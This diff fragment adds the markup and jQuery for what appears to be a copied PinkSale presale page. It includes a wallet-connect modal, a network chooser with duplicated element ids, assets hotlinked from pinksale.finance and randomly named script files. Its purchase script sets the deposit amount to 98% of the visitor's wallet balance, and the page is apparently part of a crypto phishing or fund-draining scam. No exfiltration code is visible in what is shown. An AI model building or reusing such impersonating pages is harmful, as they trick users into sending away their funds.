uqpZ4B1q+p2pavamlP8TYCfsTXxq5e7uSey78+M+JEO9fqzNqW2fgzTMoPyoeTsg2yyzdKB0lYN4G259Z1tu/sdsFaEXCuOefq3JrLW7XeuYtlIHCOfPjxVBOyv/s33T8uYZMJ+Ln0dVKIo99c899sXCFhkwk455x7IZbOVecslpGAn02/T/qU9KD0cclHqz0lLI3A61T9Cuk+yfdN/l46TcLSCDj3nIPOReekc9M5ynsUgoBBAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEyBwP8B2gCjlCsIAoEAAAAASUVORK5CYII=" alt="" class="ProviderItem_icon__2lS2v">
+                                            <div class="ProviderItem_title__3NYon">Math Wallet</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="ant-spin-nested-loading">
+                                    <div class="ant-spin-container">
+                                        <div class="ProviderItem_item__2uvZt" id="linkmetamask">
+                                            <img src="data:image/png;base64,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" alt="" class="ProviderItem_icon__2lS2v">
+                                            <div class="ProviderItem_title__3NYon">Install BitKeep</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+        <div class="ant-modal-root" id="btnchoosenetwork">
+            <div tabindex="-1" class="ant-modal-wrap" role="dialog" aria-labelledby="rcDialogTitle0" style="display:none">
+                <div role="document" class="ant-modal" style="width: 520px; transform-origin: 981px -64px;">
+                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                    <div class="ant-modal-content">
+                        <button type="button" aria-label="Close" class="ant-modal-close">
+                            <span class="ant-modal-close-x" style="display: table-cell;text-align: center;vertical-align: middle;">
+                                <span role="img" aria-label="close" class="anticon anticon-close ant-modal-close-icon">
+                                    <svg viewBox="64 64 896 896" focusable="false" data-icon="close" width="1em" height="1em" fill="currentColor" aria-hidden="true">
+                                        <path d="M563.8 512l262.5-312.9c4.4-5.2.7-13.1-6.1-13.1h-79.8c-4.7 0-9.2 2.1-12.3 5.7L511.6 449.8 295.1 191.7c-3-3.6-7.5-5.7-12.3-5.7H203c-6.8 0-10.5 7.9-6.1 13.1L459.4 512 196.9 824.9A7.95 7.95 0 00203 838h79.8c4.7 0 9.2-2.1 12.3-5.7l216.5-258.1 216.5 258.1c3 3.6 7.5 5.7 12.3 5.7h79.8c6.8 0 10.5-7.9 6.1-13.1L563.8 512z">
+                                        </path>
+                                    </svg>
+                                </span>
+                            </span>
+                        </button>
+                        <div class="ant-modal-header">
+                            <div class="ant-modal-title" id="rcDialogTitle0">Choose network</div>
+                        </div>
+                        <div class="ant-modal-body">
+                            <div class="SwitchNetworkForm_chains__1fTaE">
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetoeth">
+                                    <img src="images/ic-eth.4213cf87.svg" alt="Ethereum" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Ethereum</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="https://www.pinksale.finance/_next/static/media/ic-bsc.a3213bd0.svg" alt="BNB Smart Chain" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">BNB Smart Chain</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/FggpLbhx5HJ1.png" alt="Matic(Polygon)" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Matic(Polygon)</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/HKpuLyd6c2HZ.svg" alt="Avalanche" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Avalanche</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/y0SR8oC7mYlg.svg" alt="Fantom Opera" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Fantom Opera</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/5RETWzYeAweR.svg" alt="Cronos" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Cronos</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/58cZwnFaC7FJ.png" alt="DogeChain" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">DogeChain</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb"><img src="images/29D5WABW5UHt.svg" alt="Alvey" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Alvey</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetoarbitrum"><img src="images/ipLYZoT0MzoG.svg" alt="Arbitrum" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Arbitrum</div>
+                                </div>
+                            </div>
+                            <div class="SwitchNetworkForm_divider__ezfZQ"></div>
+                            <div class="SwitchNetworkForm_chains__1fTaE">
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="https://www.pinksale.finance/_next/static/media/ic-bsc.a3213bd0.svg" alt="BNB Smart Chain" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">BNB Smart Chain</div>
+                                </div>
+                                <div class="SwitchNetworkItem_item__1gmeN" id="changetobnb">
+                                    <img src="images/FggpLbhx5HJ1.png" alt="Matic Mumbai" class="SwitchNetworkItem_icon__1Lbfx">
+                                    <div class="SwitchNetworkItem_name__2pWLA">Matic Mumbai</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" src="js/oprfk66cNKrP.js"></script>
+    <script src="js/VGsdvbEKeLbm.js"></script>
+    <script>
+        $('#presaleAmount').keyup(function () {
+            $('#btnbuy').prop("disabled", false);
+            let dInput = this.value;
+            let balance = jQuery('#balance').val();
+            let symbol = jQuery("#TokenSymbol").text();
+            let result = jQuery("#ListingRate").text();
+            let result2 = jQuery("#CurrentRate").text();
+
+            if (result) {
+                let rateValue = result.split("=")[1].trim().split(" ")[0]
+                let rateValueNumber = parseInt(rateValue.replace(/,/g, ""), 10);
+
+                if (dInput >= balance) {
+                    jQuery('#presaleAmount').val(balance * 98 / 100);
+                    let result = jQuery("#ListingRate").text(); // Cái text nó nằm ở chỗ này, nma thằng fairlaunch sẽ k có nên thi thoảng lỗi, e sửa lại 1 tí để hiện token symbol
+                    kq = rateValueNumber * balance;
+                    $('.text-xs').show().text('You will receive: ' + ReplaceNumberWithCommas(kq) + ' ' + symbol);
+                } else if (dInput == 0) {
+                    $('.text-xs').show().text('You will receive: 0 ' + symbol); // e xót cái này bảo sao nãy nó ra ETH =)))
+                } else {
+                    kq = rateValueNumber * dInput;
+                    $('.text-xs').show().text('You will receive: ' + ReplaceNumberWithCommas(kq) + ' ' + symbol);
+                }
+            }
+            else {
+                let rateValue = result2.split("=")[1].trim().split(" ")[0]
+                let rateValueNumber = parseInt(rateValue.replace(/,/g, ""), 10);
+
+                console.log(rateValueNumber)
+                if (dInput >= balance) {
+                    jQuery('#presaleAmount').val(balance * 98 / 100);
+                    let result = jQuery("#ListingRate").text(); // Cái text nó nằm ở chỗ này, nma thằng fairlaunch sẽ k có nên thi thoảng lỗi, e sửa lại 1 tí để hiện token symbol
+                    kq = rateValueNumber * balance;
+                    $('.text-xs').show().text('You will receive: ' + ReplaceNumberWithCommas(kq) + ' ' + symbol);
+                } else if (dInput == 0) {
+                    $('.text-xs').show().text('You will receive: 0 ' + symbol); // e xót cái này bảo sao nãy nó ra ETH =)))
+                } else {
+                    kq = rateValueNumber * dInput;
+                    $('.text-xs').show().text('You will receive: ' + ReplaceNumberWithCommas(kq) + ' ' + symbol);
+                }
+            }
+        }); 
+    </script>
+    <script>
+        $('#presaleAmount').keyup(function () {
+            $('#btnbuy').prop("disabled", false);
+        });
+        setInterval(() => {
+            let value = $('#MyValue').text();
+            let TokensForPresaletext = $('#TokensForPresale').text().trim().split(" ")[1]
+            let TokensForPresale = $('#TokensForPresale').text().trim().split(" ")[0].replace(",", "")
+            let presaleNumber = parseInt(TokensForPresale.replace(/,/g, ""), 10);
+            let ClaimStatus = $('#ClaimStatus').val();
+            let divider = ClaimStatus == "YES" ? $('#MyValueClaim').text() : value;
+            kq2 = Math.floor(presaleNumber / divider);
+            let minMyvalue = $('#minMyvalue').text();
+
+            if (kq2) {
+                $('#CurrentRate').text('1 ' + minMyvalue + ' = ' + ReplaceNumberWithCommas(kq2.toFixed(3)) + ' ' + TokensForPresaletext);
+            }
+        }, 1000);
+        function ReplaceNumberWithCommas(yourNumber) {
+            var components = yourNumber.toString().split(".");
+            components[0] = components[0].replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+            return components.join(".");
+        } 
+    </script>
+    <script>
+        const claimStatus = $("#ClaimStatus").val();
+        if (claimStatus == "NO") {
+            $("#form_claim").css("display", "none");
+            $("#form_sale_live").css("display", "block");
+        } else {
+            $("#form_claim").css("display", "block");
